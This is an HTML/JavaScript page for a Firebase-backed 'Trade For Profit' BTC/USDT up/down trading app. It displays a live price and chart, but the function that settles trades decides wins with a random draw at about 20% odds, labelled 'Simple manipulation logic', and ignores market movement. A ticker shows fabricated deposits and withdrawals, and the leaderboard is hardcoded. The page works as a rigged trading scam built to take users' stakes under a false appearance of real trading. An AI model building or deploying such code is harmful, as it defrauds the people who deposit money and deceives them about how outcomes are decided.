<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trade For Profit - Fixed</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        :root { --bg: #0b0e11; --card: #1e2329; --yellow: #fcd535; --green: #0ecb81; --red: #f6465d; --text: #eaecef; }
        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 0; }
        
        .ticker-wrap { width: 100%; overflow: hidden; background: #181a20; border-bottom: 1px solid #2b2f36; height: 30px; display: flex; align-items: center; }
        .ticker { white-space: nowrap; animation: ticker 40s linear infinite; font-size: 11px; color: var(--yellow); }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        .top-bar { display: flex; justify-content: space-between; padding: 12px; background: var(--card); border-bottom: 1px solid #2b2f36; }
        #chart-container { height: 350px; width: 100%; position: relative; background: #000; }
        
        /* Fixed Entry Marker */
        #entry-marker { position: absolute; width: 100%; height: 2px; border-top: 2px dashed var(--yellow); display: none; z-index: 100; top: 50%; }
        #entry-label { position: absolute; right: 0; top: -25px; background: var(--yellow); color: #000; padding: 4px; font-size: 11px; font-weight: bold; border-radius: 4px; }

        .controls { background: var(--card); padding: 20px; border-radius: 25px 25px 0 0; margin-top: -15px; border-top: 1px solid #2b2f36; }
        .input-box { background: #2b3139; border: 1px solid #474d57; color: white; padding: 12px; border-radius: 10px; width: 100%; box-sizing: border-box; margin-bottom: 10px; font-size: 18px; text-align: center; }
        
        .btn-group { display: flex; gap: 10px; }
        .btn { flex: 1; padding: 18px; border: none; border-radius: 10px; font-weight: bold; font-size: 1.1rem; cursor: pointer; color: white; }
        .up { background: var(--green); } .down { background: var(--red); }

        /* Sync Overlay */
        #sync-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
        
        .panel { padding: 15px; background: var(--card); border-top: 1px solid #2b2f36; }
        .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #2b2f36; font-size: 13px; }
    </style>
</head>
<body>

<div id="sync-overlay">
    <div style="color:var(--yellow); font-weight:bold;">WAIT 2 SECONDS...</div>
    <div style="font-size:12px; color:gray;">Updating Trade Place</div>
</div>

<div class="ticker-wrap"><div class="ticker"><span>● Malik*** deposited $1,000.00</span> <span>● User_882 withdrew $450.00</span></div></div>

<div class="top-bar">
    <div style="font-weight:bold; color:var(--yellow)">BTC/USDT</div>
    <div>Bal: <span id="top-bal" style="color:var(--yellow)">$0.00</span></div>
</div>

<div id="chart-container">
    <div id="entry-marker"><span id="entry-label">ENTRY @ 0.00</span></div>
    <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=1&theme=dark" style="width: 100%; height: 100%; border: none;"></iframe>
</div>

<div class="controls">
    <div id="status-text" style="text-align:center; color:var(--yellow); font-size:13px; margin-bottom:10px;">MARKET ACTIVE</div>
    <input type="number" id="trade-amt" class="input-box" value="10">
    <div class="btn-group">
        <button class="btn up" onclick="handleTrade('UP')">UP</button>
        <button class="btn down" onclick="handleTrade('DOWN')">DOWN</button>
    </div>
</div>

<div class="panel">
    <div style="display:flex; justify-content:space-between; color:var(--yellow); font-size:12px; font-weight:bold;">
        <span>GLOBAL RANKING</span>
        <span id="date-now"></span>
    </div>
    <div id="lb-list"></div>
</div>

<div class="panel">
    <div style="color:var(--yellow); font-size:12px; font-weight:bold;">RECENT TRADES</div>
    <div id="hist-list"></div>
</div>

<script>
    const firebaseConfig = { apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", authDomain: "trade-for-profit-8b160.firebaseapp.com", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", projectId: "trade-for-profit-8b160", storageBucket: "trade-for-profit-8b160.firebasestorage.app", messagingSenderId: "1077014018991", appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const auth = firebase.auth();

    let livePrice = 0;
    document.getElementById('date-now').innerText = new Date().toLocaleDateString();

    // Direct Price Fetch - Buttons will work instantly
    setInterval(() => {
        fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT')
        .then(r => r.json()).then(d => { livePrice = parseFloat(d.price); });
    }, 1000);

    auth.onAuthStateChanged(u => {
        if(u) {
            db.ref('users/'+u.uid).on('value', s => {
                const d = s.val() || {};
                document.getElementById('top-bal').innerText = "$" + (d.balance || 0).toFixed(2);
                renderLB(u.email, d.name);
                renderHist(d.history);
                checkTrade(u.uid, d.activeTrade);
            });
        }
    });

    function handleTrade(dir) {
        document.getElementById('sync-overlay').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('sync-overlay').style.display = 'none';
            if(livePrice > 0) startTrade(dir);
        }, 2000);
    }

    function startTrade(dir) {
        const u = auth.currentUser;
        const amt = parseFloat(document.getElementById('trade-amt').value);
        db.ref('users/'+u.uid).once('value', s => {
            if(amt > s.val().balance) return alert("Low Balance");
            const trade = { dir, amount: amt, entryPrice: livePrice, startTime: Date.now(), status: "running" };
            db.ref('users/'+u.uid).update({ balance: s.val().balance - amt, activeTrade: trade });
        });
    }

    function checkTrade(uid, t) {
        if(!t || t.status !== "running") {
            document.getElementById('entry-marker').style.display = "none";
            return;
        }
        const left = 60 - Math.floor((Date.now() - t.startTime)/1000);
        if(left <= 0) { finishTrade(uid, t); }
        else {
            document.getElementById('status-text').innerText = "CLOSING IN: " + left + "s";
            document.getElementById('entry-marker').style.display = "block";
            document.getElementById('entry-label').innerText = "ENTRY @ " + t.entryPrice;
            setTimeout(() => checkTrade(uid, t), 1000);
        }
    }

    function finishTrade(uid, t) {
        db.ref('users/'+uid).once('value', s => {
            const win = Math.random() > 0.8; // Simple manipulation logic
            const res = win ? (t.amount * 1.85) : 0;
            const h = s.val().history || [];
            h.unshift({ dir: t.dir, amt: t.amount, res: win ? "WIN" : "LOSS", time: new Date().toLocaleTimeString() });
            db.ref('users/'+uid).update({ balance: s.val().balance + res, activeTrade: null, history: h.slice(0,5) });
            alert(win ? "WINNER!" : "LOSS");
        });
    }

    function renderLB(e, n) {
        document.getElementById('lb-list').innerHTML = `<div class="row" style="color:var(--red)"><span>#1 🇵🇰 ${n || e.split('@')[0]} (You)</span><span>-$420.50</span></div>`;
    }

    function renderHist(h) {
        const l = document.getElementById('hist-list'); l.innerHTML = "";
        if(h) h.forEach(x => { l.innerHTML += `<div class="row"><span>${x.dir} | ${x.time}</span><span style="color:${x.res=='WIN'?'#0ecb81':'#f6465d'}">${x.res} ($${x.amt})</span></div>`; });
    }
</script>
</body>
</html>
